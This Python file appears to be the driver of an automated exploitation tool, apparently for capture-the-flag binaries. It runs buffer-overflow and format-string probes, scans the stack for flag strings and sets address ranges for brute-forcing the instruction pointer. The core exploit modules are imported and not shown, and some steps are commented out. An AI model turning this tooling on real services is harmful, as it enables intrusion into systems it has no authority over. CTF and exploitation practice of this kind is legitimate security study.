import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from exploit.bof_exploit import OverflowExploit
from exploit.string_bug import FormatStringExploit
from dispatcher import Dispatcher
from printer import print_colored

class Exploit:
    def __init__(self, config : dict[str, str | bool | int]):
        self.config : dict[str, str | bool | int] = config
        self.dispatcher : Dispatcher = Dispatcher(self.config)
        if not self.dispatcher.is_connected():
            self.dispatcher.connect()

    def run_bof_exploit(self):
        bof_exploit = OverflowExploit(self.config, self.dispatcher)
        bof_index = bof_exploit.try_overflow()
        return bof_index

    def run_string_bug_exploit(self):
        string_exploit = FormatStringExploit(self.config, self.dispatcher)
        str_offset, str_stack_alignment = string_exploit.find_offset(max_offset=100)
        if str_offset == None or str_stack_alignment == None:
            print_colored("[-] No direct format string bug detected", 'red')
            if self.config.get("flag_format"):
                print_colored(f"[+] Trying to find flag format: {self.config.get('flag_format')}", 'cyan')
                flag_extracted = string_exploit.find_pattern_in_stack(pattern_to_find=self.config.get("flag_format"), max_length=100)
                for addr, flag in flag_extracted:
                    print_colored(f"[+] Possible flag found: {flag} at address {addr}", 'green')
                if flag_extracted:
                    return
            print_colored("[-] No string bug format detected", 'red')
            return
        
        print_colored(f"[+] String bug format detected with offset: {str_offset} and stack alignment: {str_stack_alignment}", 'green')

        print_colored(f"[+] Trying to find stack addresses...", 'yellow')

        # addresses = string_exploit.return_stack_addresses()

        # if not self.dispatcher.aslr_enabled() or self.dispatcher.is_infinite_loop():
        #     stack_ip = string_exploit.find_instruction_pointer_in_stack(addresses=addresses)
        #     if stack_ip:
        #         print(f"[+] Instruction pointer found at address: {hex(stack_ip)}")
        #         return stack_ip

        print_colored(f"[-] No instruction pointer found in stack addresses", 'red')
        # Try brute to find a way to overwrite the instruction pointer using .text section range

        print_colored(f"[+] Trying to brute force the instruction pointer address...", 'yellow')

        if self.dispatcher.pie_enabled() and self.dispatcher.is_infinite_loop():
            if self.dispatcher.get_arch() == "i386":
                text_range = (0x08000000, 0xc0000000)
            elif self.dispatcher.get_arch() == "x86_64":
                text_range = (0x4000000000, 0x7fffffffffff)
        elif not self.dispatcher.pie_enabled():
            if self.dispatcher.get_arch() == "i386":
                text_range = (0x08048000, 0x08049000)
            elif self.dispatcher.get_arch() == "x86_64":
                text_range = (0x400000, 0x402000)
    
        # stack_ip = string_exploit.find_instruction_pointer_bruteforce(range_address=text_range)
        